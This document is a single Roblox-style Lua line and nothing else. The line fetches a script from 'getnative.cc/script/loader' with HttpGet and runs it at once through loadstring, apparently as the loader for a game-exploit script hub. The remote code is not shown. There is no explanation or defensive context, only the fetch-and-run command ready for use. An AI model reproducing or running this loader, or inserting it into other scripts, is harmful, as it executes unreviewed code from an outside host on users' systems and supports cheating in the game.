loadstring(game:HttpGet("https://getnative.cc/script/loader"))()
